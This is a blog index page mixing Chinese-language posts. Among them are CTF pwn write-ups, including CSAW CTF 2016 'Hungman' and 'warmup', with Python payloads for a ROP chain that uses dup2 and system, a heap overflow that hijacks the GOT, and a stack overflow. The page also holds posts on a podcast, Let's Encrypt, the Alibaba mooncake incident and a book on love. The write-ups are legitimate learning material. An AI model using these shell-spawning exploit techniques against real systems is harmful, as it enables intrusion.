<li>選項 2 會接收長達 460 bytes 的輸入，並從輸入 buffer 開始輸出 324bytes。透過 IDA 得知該 buffer 的起點位在  <code>rbp-320</code> ，所以這裡可以 leak 出位於 <code>rbp-8</code> 的 canary。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write(socket_num, <span class="string">&quot;Time to test your exploit...\n&quot;</span>, <span class="number">0x1D</span>uLL);</span><br><span class="line">write(socket_num, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">read(socket_num, &amp;s, <span class="number">460uLL</span>);</span><br><span class="line">write(socket_num, &amp;s, <span class="number">324uLL</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>選項 3 離開程式。</li>
</ul>
<hr>
<p>有了 libc address 和 canary 後就可以開始蓋 ROP chain 了。原本想直接蓋 <code>system</code> 開 shell，不知道為什麼失敗了，問了才知道由於前面的 <code>fork</code>，這邊直接叫 <code>system</code> 的話 file descriptor 會接不起來。所以我們要先用 <code>dup2()</code> 把 fd 設好才行。<br>由於前面呼叫 <code>read</code>  時已經把 rdi 設成我們要的值了，所以用 <code>dup2</code> 之前只要再把 rsi 設好即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chain = <span class="string">&#x27;A&#x27;</span>*<span class="number">312</span> + p64(canary) + <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span> +</span><br><span class="line">	  p64(pop_rsi_r15_ret) + p64(<span class="number">0x0</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(dup2) +</span><br><span class="line">	  p64(pop_rsi_r15_ret) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(dup2) +</span><br><span class="line">	  p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br></pre></td></tr></table></figure>

<p>把一開始 <code>accept</code> 的回傳值送給 <code>stdin</code> 和 <code>stdout</code> 之後 call <code>system</code> 就可以拿到 shell 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/20/2016/2016-09-20-caipai-fm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/20/2016/2016-09-20-caipai-fm/" itemprop="url">我录了一档叫「彩排」的播客</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-20T00:00:00+08:00">
                2016-09-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一个人住有一年时间了，也养成了听播客的习惯，我最喜欢的是 IPN 一档叫「太医来了」的播客，同时我也听过「内核恐慌」和「 Teahour 」这样的技术类播客，听久了也有自己录一档播客的冲动。</p>
<p>终于经过了很多的准备工作之后，我把这个想法付诸实践了，播客的名字叫「彩排」，你可以在 iTunes 直接搜索，也可以访问 <a target="_blank" rel="noopener" href="https://caipai.fm/">caipai.fm</a> 在线收听和下载。如果有任何的建议意见，可以发邮件到 <a href="mailto:&#x66;&#x65;&#x65;&#100;&#98;&#97;&#x63;&#107;&#64;&#99;&#97;&#x69;&#x70;&#x61;&#105;&#x2e;&#102;&#109;">&#x66;&#x65;&#x65;&#100;&#98;&#97;&#x63;&#107;&#64;&#99;&#97;&#x69;&#x70;&#x61;&#105;&#x2e;&#102;&#109;</a>。</p>
<p>前三期的主题分别是「自由软件和许可证」、「番茄工作法」、「密码和互联网安全」，我本不想把它限制为一个技术类播客，但我所了解并且可以分享给大家的恐怕大部分都是技术方面的话题了。接下来的选题可能会包括： Email 、 JavaScript 、比特币、养猫等。</p>
<p>因为我本来不善言辞，也没有音频录制和剪辑的经验，最后效果其实不是很理想，还不能与开头提到的几档播客相提并论。但在这前三期的制作中，我的水平也在一点点提高，期待将来能越做越好吧。此外我感觉一个人讲会让听众有一种「压力」，可能还是两个人以对话的方式录效果会更好，如果你希望参与进来也欢迎和我联系。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/19/CSAW-CTF-16-Hungman-300/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/19/CSAW-CTF-16-Hungman-300/" itemprop="url">[CSAW CTF 2016] Hungman 300</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T23:33:00+08:00">
                2016-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn		<br>Point: 300	<br>Solver: nae @ BambooFox	<br>第一次貢獻大分數給 BambooFox，雖然這次比賽比較簡單，但還是很感動QQ</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE</p>
<p>程式一開始會要求輸入名字，而他會 <code>malloc</code> 名字長度的記憶體來存放使用者輸入的名字，接著會 <code>malloc</code> 一塊 0x80 大小的 heap，以下稱之為 <code>key_heap</code>，第一格<strong>高位</strong> 4 bytes 會存放 length of name，第二格則儲存著 name’s heap 的位址。</p>
<p>name’s heap &amp; key_heap 的 memory layout 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">low     -&gt;     high</span><br><span class="line">+ ------------- +  name<span class="string">&#x27;s heap chunk head</span></span><br><span class="line"><span class="string">| previous size |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|      size     |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|      name     |  32 bytes</span></span><br><span class="line"><span class="string">|               |		|</span></span><br><span class="line"><span class="string">|               |		|</span></span><br><span class="line"><span class="string">|               |		v</span></span><br><span class="line"><span class="string">+ ------------- +  key_heap chunk head</span></span><br><span class="line"><span class="string">| previous size |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|      size     |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|       |length |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|  name&#x27;</span>s heap  |</span><br><span class="line">+ ------------- +</span><br></pre></td></tr></table></figure>
<p>輸入完名字之後，回到了 <code>main</code>，接著便進入玩遊戲的 function 以下稱為 game。</p>
<p>遊戲是猜小寫英文字母，然後如果分數超過 64 分可以重新改名字，而改寫名字時可以在 heap 上進行 overflow。</p>
<p>因為是猜小寫字母，而照他的規則一開始輸入名字的長度<br>決定可以猜的次數，因此一開始輸入名字時就給他來個 <code>&#39;A&#39;*26</code>，這樣基本上從 a 猜到 z 猜到一半就能夠破分數紀錄而改寫名字。</p>
<p>改寫名字的 code 重點如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">malloc</span>(<span class="number">248</span>);</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">248</span>);</span><br><span class="line">len_of_new_name = read(<span class="number">0</span>, s, <span class="number">248</span>);</span><br><span class="line">*(_DWORD*)(a1 + <span class="number">4</span>) = len_of_new_name; <span class="comment">// 把剛剛 key_heap 存 name size 的地方改成 new name 的 size</span></span><br><span class="line"><span class="built_in">memcpy</span>(*(<span class="type">void</span>**)(a1 + <span class="number">8</span>), s, len_of_new_name);</span><br><span class="line"><span class="built_in">free</span>(s);</span><br></pre></td></tr></table></figure>
<p>由上面的 code 可以發現，他最長可以讀 248 bytes，而我們一開始輸入的名字長度只有 26，因此 new name 可以好好的構造來 <strong>leak information</strong>。</p>
<p>因為離開 game 後會把新名字 dump 出來，而程式找 <code>name_heap</code> 的方式是靠 <code>key_heap</code> 的第二格來找，因此在剛剛的 overflow 時我們將原本儲存著 name’s heap address 的那格改成 GOT entry，這樣一來，在 dump new name 的時候便可以 <strong>leak libc information</strong> 接著利用主辦方給的 libc 就可以找到 <code>libc base</code>。</p>
<p>這邊 overflow 的 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">32</span> <span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># previous size</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>) <span class="comment"># size</span></span><br><span class="line">payload += p32(<span class="number">0x20</span>) <span class="comment"># score</span></span><br><span class="line">payload += p32(<span class="number">0x1b</span>) <span class="comment"># len_of_new_name</span></span><br><span class="line">payload += p64(libc_start_main) <span class="comment"># __libc_start_main GOT entry</span></span><br></pre></td></tr></table></figure>

<p>size 那邊沒必要寫壞就寫回原來的值，下一格的<strong>低位</strong> 4 bytes 會是 這次刷新的分數(下面提供相關 code)，為了加速下次玩遊戲時間，把分數改低一點，然後因為猜個 26 次就很夠了所以<strong>高位</strong> 4 bytes 寫回原來的長度就好了，接下來再玩一次。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">score = *(_DWARD*)a1;</span><br></pre></td></tr></table></figure>

<p>第二次改名時就不會改到 name’s heap，會改到剛剛 overwrite 的 <code>__libc_start_main</code> GOT entry 上。</p>
<p>GOT table 的 libc function order:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main@got.plt</span><br><span class="line">__gmon_start__@got.plt</span><br><span class="line">memcpy@got.plt</span><br><span class="line">malloc@got.plt</span><br><span class="line">setvbuf@got.plt</span><br></pre></td></tr></table></figure>
<p>因為在改名字時有一段 code 是 <code>memcpy(*(void**)(a1+8), s, len_of_new_name)</code>，所以把 <code>memcpy</code> 的 GOT hijack 掉改成 <code>system</code>，要注意的點是改名字時會用到 <code>malloc</code> 而 <code>read</code> 會在結尾補 <code>\x00</code> 所以乾脆直接連 <code>malloc</code> 也一起蓋正確的 <code>libc address</code> 確保他不會壞，而 <code>malloc</code> 的下一個 function 後面用不到就不用管他。這邊 payload 開頭我就先送 <code>&#39;sh\x00&#39;</code> 上去這樣 <code>memcpy</code> 的一開始就可以直接 <code>system(&#39;sh&#39;)</code>。</p>
<p>第二次的 payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(malloc)</span><br></pre></td></tr></table></figure>

<p>之後再玩一次遊戲，然後改名字的時候隨便輸入就可以拿到 shell。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/19/CSAW-CTF-2016-warmup-50/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/19/CSAW-CTF-2016-warmup-50/" itemprop="url">[CSAW CTF 2016] warmup 50</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T23:31:00+08:00">
                2016-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>Category: pwn		<br>Point: 50		<br>Solver: nae @ BambooFox	</p>
</blockquote>
<p>和藹可親的 warmup</p>
<p>64 bit ELF NX, Partial RELRO, no canary, no PIE</p>
<p>這題就簡單的 <code>stack overflow</code> 量一下 offset，他有一個 function 會直接 <code>system(&#39;cat flag.txt&#39;)</code>，在 ret address 的地方蓋成那個 function 就可以拿 flag。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/19/2016/use-certbot-to-issue-lets-encrypt-certificates/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/19/2016/use-certbot-to-issue-lets-encrypt-certificates/" itemprop="url">使用 Certbot 自动签发 Let's Encrypt 证书</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T22:59:17+08:00">
                2016-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>今晚一回来就看到 Google Search Console 给我发了封邮件说我站点上的 SSL 证书过期了。我上去一看还真是，这张我从 Andy 手里买来的通配符证书已经在昨天失效了。</p>
<p>唉，时间也是过得忒快啊，转眼间一年就过去了，我也成为了苦逼的高三党，真是惨得不行 ( ・_ゝ・)</p>
<p>不过正好，我从 <a target="_blank" rel="noopener" href="https://prinzeugen.net/lets-encrypt-now-we-are-trusted/">之前就一直在关注</a> Let’s Encrypt 这个项目了，这次正好试试看它好不好用。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/19/2016/use-certbot-to-issue-lets-encrypt-certificates/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/17/2016/2016-09-17-alibaba-yuebing/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/17/2016/2016-09-17-alibaba-yuebing/" itemprop="url">我看「刷月饼」事件</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-17T00:00:00+08:00">
                2016-09-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>前因后果见 <a target="_blank" rel="noopener" href="https://www.zhihu.com/topic/20060618/hot">知乎：阿里月饼事件</a>；关于本文的讨论见 <a target="_blank" rel="noopener" href="https://www.v2ex.com/t/306691">V2EX: 关于刷月饼事件我来唱点反调</a></p>
</blockquote>
<p>可能发得有点晚了，是因为我不是有感于事件本身，而是看了大家的讨论一边倒地黑阿里，以至于有一些逻辑显得不是那么合理，所以我想 <strong>仅就几个细节问题</strong> 谈一谈我的想法。</p>
<h3 id="这是不是一个价值观问题"><a href="#这是不是一个价值观问题" class="headerlink" title="这是不是一个价值观问题"></a>这是不是一个价值观问题</h3><p>我觉得这是一个价值观问题，就好像就是有人觉得「刷月饼」不妥甚至很严重，也有人认为没什么大不了。所谓价值观就是指你如何看待一件事情的对错、如何进行选择，很难说谁对谁错，但这两种人的价值观的确是不同的。公司因为价值观不同开除一个员工其实也没什么不对，对双方都有好处，如果被开除的人不觉得是自己的错，那么也很难说是对他的伤害。</p>
<h3 id="下单但没有购买算不算得到了「利益」"><a href="#下单但没有购买算不算得到了「利益」" class="headerlink" title="下单但没有购买算不算得到了「利益」"></a>下单但没有购买算不算得到了「利益」</h3><p>既然下单是需要抢的，说明这个订单很可能对应着一份库存，你下单成功了意味着你得到了这样一份权利 —— 你可以在未来的一个小时里决定要不要买这个月饼，你甚至可以等有人出了一个合适的价格之后转卖这个月饼，可以说这种购买的权利就是「抢月饼」的核心利益，所以订单最后是否成交不影响刷月饼获利的这个事实。</p>
<h3 id="信息安全相关职位刷月饼是否可以减轻责任"><a href="#信息安全相关职位刷月饼是否可以减轻责任" class="headerlink" title="信息安全相关职位刷月饼是否可以减轻责任"></a>信息安全相关职位刷月饼是否可以减轻责任</h3><p>的确可能这个职位的工作之一就是去发现漏洞，但这也是在有工作安排的情况下，而且发现漏洞（活动规则设计不合理可以认为是广义的漏洞）后也不应该去利用它为自己谋利（是否算谋利已在前一小节讨论）。所谓 Geek 精神不应该被当作一个挡箭牌，在一个大的群体里还是要去遵守普适的规则，刷月饼就好像钻公司规章中的空子。<strong>打一个比方的话就好像办公室桌上有十几块月饼给大家吃，并没有限制一个人可以拿几块，但你一个人就拿了一大半，这显然不妥。</strong></p>
<h3 id="抢月饼网站设计不合理开发者是否有责任"><a href="#抢月饼网站设计不合理开发者是否有责任" class="headerlink" title="抢月饼网站设计不合理开发者是否有责任"></a>抢月饼网站设计不合理开发者是否有责任</h3><p>我觉得这本来就是一个内部的活动，要考虑一个投入产出的性价比，不可能做到和对外的服务一样稳定和周全，在公司内部大家是有一个基本的信任的。因为往往一个公司的同事之间有着共同的利益和相近的价值观，没必要将方方面面都限制死，相信如果为抢月饼设计一个事无巨细、毫无漏洞的规则也不是大家希望看到的。</p>
<h3 id="抢火车票和抢月饼是否是一回事"><a href="#抢火车票和抢月饼是否是一回事" class="headerlink" title="抢火车票和抢月饼是否是一回事"></a>抢火车票和抢月饼是否是一回事</h3><p>和前一点有点像，对外和对内是有分别的，从抢火车票这一点来说，你对其他买不到火车票的人是不负有任何的责任的，只要你不违反法律和协议你可以做任何事情；但在公司内则不同，大家需要有基本信任，即使没有明文的规则写明，当然你也可以不遵守这种「潜规则」，后果大概就是因为价值观不符被开除了，只要补偿给到位，开除当然也是合法的。</p>
<h2 id="写在后"><a href="#写在后" class="headerlink" title="写在后"></a>写在后</h2><p>说实话，当我说出这些想法之后我有点怀疑人生，有点怀疑当我的意见和别人不同的时候我是否应该说出来，因为有的时候说出来会招致一些攻击，也会被一些本来是朋友的人划为异类。每当我看到这种一边倒的舆论的时候，我总会有点警惕，因为一边倒意味着既然大家的目标是一样的，即使过程有一些小差错也无所谓，当你指出这些问题的时候，就会有人说你在洗地。没错，腾讯抄袭的时候我给腾讯洗、百度搞竞价排名的时候我给百度洗。</p>
<p>回到讨论本身，我简单补充几点：</p>
<ul>
<li>如果有公司真的会因为「价值观」而开除一名员工，我觉得是值得尊敬的，因为这家公司会在意在一起工作的同事是什么样的人，只有这样才能构建出一种凝聚力。当然，这在大公司是很难做到一碗水端平的，也很难说这是否是阿里开除几名员工的真正原因。</li>
<li>很多人比较在意最后两点中的「双重标准」，我觉得这是一个很正常的事情，对家人、对同事，和对陌生人我们是有不同的要求和期待的，在公司抢月饼要比在陌生人间抢火车票有更多的道德约束我觉得也是合理的。</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/16/2016-09-16-what-is-love/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/16/2016-09-16-what-is-love/" itemprop="url">什么是爱 - 读《少有人走的路》</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-16T23:04:36+08:00">
                2016-09-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <img src="/images/the-road-less-traveled-book.jpg" class="">

<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>爱是什么？这或许是一个永恒的话题。我很少从学校的传统教育以及家庭教育中获得这方面的知识。</p>
<p>我小的时候对于爱的解释，印象中的故事竟然都是来自是电影：一部是 <a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B%E5%8F%B7/6162581">《泰坦尼克号》</a>，另一部是 <a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E7%9C%9F%E7%88%B1%E8%87%B3%E4%B8%8A/1671898">《真爱至上》</a>。《泰坦尼克号》的男主 Jack 为了心爱的人，放弃自己生存的机会，让我以为爱是一种牺牲。而在大学时看的《真爱至上》，电影中的 10 个故事，讲了各种各样爱的故事，有小朋友之间的爱，有情侣之间的爱，更有同性之间的爱。电影最后的一句台词给爱下了一个更广泛的定义：「Love actually is everthing.」，</p>
<p>我现在 30 多岁了，结婚了，也有了小孩，有些时候我觉得爱就一种亲情，但是又说不清楚。因为家庭生活中其实会有各种琐事，各种争吵，有些时候也会困惑，不知该如何处理。</p>
<p>还是要感谢李笑来老师，他推荐的这本 <a target="_blank" rel="noopener" href="http://item.jd.com/11323419.html">《少有人走的路》</a>，用更详尽的篇章，从一个学术的角度讨论了什么是爱。这本书的作者斯科特·派克是一个心理医生，在书中的第二部分，作者详尽分析了各种关于爱的行为，告诉我们什么样的行为是爱，什么样的行为不是爱。</p>
<h2 id="爱的定义"><a href="#爱的定义" class="headerlink" title="爱的定义"></a>爱的定义</h2><p>作者从他的角度，给爱下了如下的定义：</p>
<blockquote>
<p>爱，是为了促进自我和他人心智成熟，而具有的一种自我完善的意愿。</p>
</blockquote>
<p>这个定义非常有意思，完全不同于我们以前了解到的爱的描述，我们从中可以看到两个特征：</p>
<ol>
<li>爱可以使双方都获得心智成熟。这就像是杨过和小龙女的「双修」一样，是一种共同进步的互利行为。</li>
<li>爱是一种自我完善的意愿。我们都希望通过它获得心智的成熟，人格的独立。</li>
</ol>
<h2 id="爱的误解"><a href="#爱的误解" class="headerlink" title="爱的误解"></a>爱的误解</h2><p>弄清楚什么是爱是很难的，但是反过来，弄清楚什么不是爱相对来说容易一些，所以本书中分析了四种常见的错误的「爱」，分别是：坠入情网、依赖性、自我牺牲、（仅有）感觉。</p>
<h3 id="坠入情网"><a href="#坠入情网" class="headerlink" title="坠入情网"></a>坠入情网</h3><p>坠入情网不是爱。这可能是最常见的误区吧。年轻时的我们，由于荷尔蒙的分泌，对异性产生好感，进一步渴望和异性交往，然后坠入情网，最终啪啪啪以及结婚生子。作者认为坠入情网不是爱的核心理由是：坠入情网的 “爱” 不会持续太久，不管爱的对象是谁，早晚我们都会从情网的羁绊中 “爬出”。有一个词叫「七年之痒」，其实也是说这个道理。坠入情网这种爱更像是一种冲动和激情，随着时间会慢慢消退。</p>
<p>刚刚说到爱需要使双方心智变得成熟。但是坠入情网，惟一的好处就是消除寂寞。即便经由婚姻，使这一功用得以延长，也无助于心智的成熟。</p>
<p>悲观一点说，坠入情网其实是一种受人类本能控制的，来自我们 DNA 中繁衍需求的刺激。它的意义在于增加人类生殖机会，促进物种繁衍和生存。但是坠入情网其实是产生真正的爱的一个很好的媒介，后面我们再详细讨论。</p>
